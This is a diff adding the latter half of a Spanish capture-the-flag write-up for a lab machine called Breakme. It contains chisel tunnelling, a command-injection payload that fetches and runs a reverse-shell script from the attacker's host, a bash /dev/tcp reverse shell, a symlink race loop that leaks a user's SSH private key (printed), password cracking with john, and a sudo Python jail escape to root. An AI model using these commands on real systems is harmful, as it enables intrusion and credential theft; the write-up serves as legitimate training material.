@@ -335,14 +335,290 @@ Creo que ya sabemos por donde tirar no?
 
 a Pivotear
 
-Voy a utilizar ligolo-ng
+voy a utilizar chisel
 
-https://github.com/nicocha30/ligolo-ng
+```
+curl https://i.jpillora.com/chisel! | bash
+```
+
+```
+┌──(root㉿kali)-[~/Downloads/chisel]
+└─# chisel server -p 9005 --reverse &
+[1] 34779
+                                                                                         
+2025/02/18 15:10:33 server: Reverse tunnelling enabled
+2025/02/18 15:10:33 server: Fingerprint X31fp913KwP5IioJlt2CHST/ER39iVGPOgqVBSoey/M=
+2025/02/18 15:10:33 server: Listening on http://0.0.0.0:9005
+```
+
+Nos iremos posteriormente a la máquina victima y coguemos el archivo, es necesario que lo tengais en amd64
+
+Abrimos un servidor en python y metemos chisel y lo descargamos desde la máquina victima con un wget apuntando a nuestra ip
+
+Una vez lo tengamos en la máquina victima le damos permisos de ejecución y abrimos el tunel
+
+```
+www-data@Breakme:/tmp$ ./chiselexe client 10.10.67.89:9006 R:9999:127.0.0.1:9999 &
+<exe client 10.10.67.89:9006 R:9999:127.0.0.1:9999 &
+[1] 1305
+www-data@Breakme:/tmp$ 2025/02/18 10:24:05 client: Connecting to ws://10.10.67.89:9006
+2025/02/18 10:24:05 client: Connected (Latency 836.641µs)
+```
+
+Si lo tenemos todo bien montado y nos vamos a nuestra local al 9999 veremos esto:
+
+![image](https://github.com/user-attachments/assets/1454aa28-84c2-4c50-b4d4-9562773f91bb)
+
+Esto significa que hemos creado un tunel. 
+
+Si ahora checkeamos los inputs vemos 
+
+![image](https://github.com/user-attachments/assets/a79b5657-58a7-4fc5-a8fb-161b164d8b56)
+
+Vamos a abrir un "wireshark" en linux y vamos a ver si funciona de verdad esos comandos que ejecuta y si hemos hecho todo esto para nada.
+
+![image](https://github.com/user-attachments/assets/a3311f19-da45-4f00-a13f-13b1c89afe2f)
+
+Vale coño eso significa que de verdad es real, ahora me he perdido un poco y no he sabido mucho por donde tirar.
+
+Por lo que veo el "check Users" permite ejecutar comandos arbitrarios como un curl, por ejemplo si intentamos meter un rev shell con un curl a ver si funciona
+
+```
+|curl${IFS}http://10.10.67.89:8000/reverse.sh|bash
+```
+
+y en escucha desde nuestra máquina, pero dudo qeu funcione la verdad
+
+```
+└─# nc -lvnp 9090
+listening on [any] 9090 ...
+connect to [10.10.67.89] from (UNKNOWN) [10.10.102.26] 58382
+GET /reverse.sh HTTP/1.1
+Host: 10.10.67.89:9090
+User-Agent: curl/7.74.0
+Accept: */*
+```
+
+Esto significa que funciona jeje
+
+Vamos a de verdad meter una rev shell ahi
+
+```
+#!/bin/bash
+sh -i >& /dev/tcp/10.10.67.89/9090 0>&1
+```
+
+Ha costado pero estamos dentro
+
+![image](https://github.com/user-attachments/assets/222d4021-acc6-442c-a76a-46d4955c6fdf)
+
+Sacamos la primera flag madre mia jaja
+
+en /home/john/user1.txt
+
+Lo bueno de john es que ya tenemos mucho movimiento y podemos coger las claves ssh y trabajar mucho mejor, parece ser que no tiene par de claves, bueno podemos meter nuestra clave a authorized_keys y ale jeje
+
+Después de estar un rato enumerando he desistido y voy a utilizar linpeas
+
+![image](https://github.com/user-attachments/assets/ef5aa045-8b4f-4b03-8693-8ddd2265a259)
+
+Parece que encontramos un binario en el /home/yousef. con este binario 
+
+```
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <string.h>
+#include <assert.h>
+
+#define TARGET_UID 0x3ea // Target UID: 1002 in decimal
+
+// Main function that takes command-line arguments
+int main(int argc, char *argv[]) {
+
+    int access_check;
+    __uid_t user_id;
+    ssize_t bytes_read;
+    struct stat file_stat;
+    char buffer[1024];
+    int file_descriptor;
+    int read_bytes;
+    int write_bytes;
+    uint is_symlink;
+    char *flag_check;
+    char *id_rsa_check;
+    
+    // Check if exactly one argument is provided (argc should be 2)
+    if (argc == 2) {
+        // Check if the file provided exists and is accessible
+        access_check = access(argv[1], F_OK);
+        if (access_check == 0) {
+            // Get the real user ID of the calling process
+            user_id = getuid();
+            
+            // Check if the user is the target UID (1002)
+            if (user_id == TARGET_UID) {
+                // Check if the file contains "flag" or "id_rsa" in its name
+                flag_check = strstr(argv[1], "flag");
+                id_rsa_check = strstr(argv[1], "id_rsa");
+                
+                // Get file status information
+                lstat(argv[1], &file_stat);
+                
+                // Check if the file is a symbolic link
+                is_symlink = (file_stat.st_mode & S_IFMT) == S_IFLNK;
+                
+                // Check if the file is readable
+                access_check = access(argv[1], R_OK);
+                
+                // If the file does not contain "flag", is not a symlink, is readable, and does not contain "id_rsa"
+                if (flag_check == NULL && is_symlink == 0 && access_check != -1 && id_rsa_check == NULL) {
+                    // Print success message
+                    puts("I guess you won!\n");
+                    
+                    // Open the file for reading
+                    file_descriptor = open(argv[1], O_RDONLY);
+                    if (file_descriptor < 0) {
+                        // Assertion failure if the file could not be opened
+                        assert(file_descriptor >= 0 && "Failed to open the file");
+                    }
+                    
+                    // Read and output the file content to stdout
+                    do {
+                        bytes_read = read(file_descriptor, buffer, sizeof(buffer));
+                        read_bytes = (int)bytes_read;
+                        if (read_bytes < 1) break;
+                        write_bytes = write(STDOUT_FILENO, buffer, (long)read_bytes);
+                    } while (write_bytes > 0);
+                    
+                    return 0;
+                } else {
+                    // Print failure message if the file is restricted
+                    puts("Nice try!");
+                    return 1;
+                }
+            } else {
+                // If the user is not the target UID, print an error message
+                puts("You can't run this program");
+                return 1;
+            }
+        } else {
+            // If the file does not exist, print an error message
+            puts("File Not Found");
+            return 1;
+        }
+    } else {
+        // If the program is not called with exactly one argument, print usage instructions
+        puts("Usage: ./readfile <FILE>");
+        return 1;
+    }
+}
+```
+
+Básicamente el ejecutable checkea si un archivo especifico puede leer con el usuario UID 1002. 
+
+Bueno básicamente el tio esta explicado el script entero. 
 
 
+Necesitamos bypasear el filtro
+
+Necesitamos eludir el filtro y la única forma de hacerlo es a través de una condición de carrera, más específicamente una vulnerabilidad TOCTOU (Time of Check to Time of Use), el error aquí es que entre el momento en que se realizan las comprobaciones y el momento en que se abre el archivo, el estado del archivo puede cambiar. Aquí es donde entra en juego la vulnerabilidad TOCTOU, para desglosarla aún más, si un atacante crea un enlace simbólico que apunta a un archivo confidencial (como en nuestro caso /home/youcef/.ssh/id_rsa), las comprobaciones pasarán si el enlace simbólico no contiene "flag" o "id_rsa" en su nombre. Sin embargo, si el atacante logra cambiar lo que apunta el enlace simbólico antes de que ocurra la operación de lectura real, el programa leerá inadvertidamente el archivo confidencial.
+
+Gracias chat gpt
+
+Dentro del direcotrio /home/john
+
+```
+while true; do ln -sf /home/youcef/.ssh/id_rsa symlink; rm symlink; touch symlink; done &
+```
 
 
+```
+for i in {1..30}; do /home/youcef/readfile symlink; done
+```
 
+y Bingo
+
+```
+home/john
+$ while true; do ln -sf /home/youcef/.ssh/id_rsa symlink; rm symlink; touch symlink; done &
+$ for i in {1..30}; do /home/youcef/readfile symlink; done
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6
+Tuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z
+P5f1aOa67ZDRv6XlKz/0fASHI4XQF3pNBWpA79PPlOxDP3QZfZnIxNIeqy8NXrT23cDQdx
+ZDWnKO1hlrRk1bIzQJnMSFKO9d/fcxJncGXnjgBTNq1nllLHEbf0YUZnUILVfMHszXQvfD
+j2GzYQbirrQ3KfZa+m5XyzgPCgIlOLMvTr2KnUDRvmiVK8C3M7PtEl5YoUkWAdzMvUENGb
+UOI9cwdg9n1CQ++g25DzhEbz8CHV/PiU+s+PFpM2chPvvkEbDRq4XgpjGJt2AgUE7iYp4x
+g3S3EnOoGoezcbTLRunFoF2LHuJXIO6ZDJ+bIugNvX+uDN60U88v1r/SrksdiYM6VEd4RM
+s2HNdkHfFy6o5QnbBYtcCFaIZVpBXqwkX6aLhLayteWblTr7KzXy2wdAlZR3tnvK/gXXg3
+6FXABWhDDYaGkN/kjrnEg8SGT71k7HFawODRP3WMD1ssOy70vCN3SvZpKt3iMrw2PtqOka
+afve2gmscIJdfP5BdXOD419eds2qrEZ0K5473oxaIMKUmAq0fUDzmT+6a4Jp/Vz3ME
+```
+
+Puta CTF de los cojones ni aunque tengas la id_rsa ahora también tiene una contraseña que vamos a tener que crackear con john maravilloso
+
+![image](https://github.com/user-attachments/assets/8033fa3e-52a9-43bb-8d3f-6ac369f1e94b)
+
+Bueno pues lo de toda la vida con john
+
+```
+ssh2john id_rsa > id_rsa.john
+john id_rsa.john -wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+Esperamos :)
+
+Ya la tenemos jeje ale siguiente paso hecho ahora tocara el root o eso espero dios mio
+
+![image](https://github.com/user-attachments/assets/a8580865-444c-43ec-835d-a606a17528e3)
+
+Sacamos la user2.txt que esta en .ssh
+
+# Escala de privilegios
+
+```
+youcef@Breakme:~$ sudo -l -l
+Matching Defaults entries for youcef on breakme:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User youcef may run the following commands on breakme:
+
+Sudoers entry:
+    RunAsUsers: root
+    Options: !authenticate
+    Commands:
+        /usr/bin/python3 /root/jail.py
+youcef@Breakme:~$ 
+```
+
+Si probamos a ejecutar el jail.py
+
+```
+sudo /usr/bin/python3 /root/jail.py
+```
+
+Después de informarme que coño es esto
+
+https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/python-jails-escape
+
+Parece ser que simplemente podemos escaparnos
+
+![image](https://github.com/user-attachments/assets/d8fd5935-5425-4858-a53b-f94f0fe73cc3)
+
+Y tenemos comandos como root porsupuesto en este entorno, vamos a intentar generar una bash y ya salir de esta CTF porfavor
+
+![image](https://github.com/user-attachments/assets/bf0a3527-821f-48fc-ae62-6807af9ce934)
+
+GG!!!!!!!!!!!!!!!!!!!!!!!!
+
+PORFINNN
+
+![image](https://github.com/user-attachments/assets/1a27c552-ea20-4065-aaab-45a009bb95bd)
+
+Os la regalo GG
 
 
 
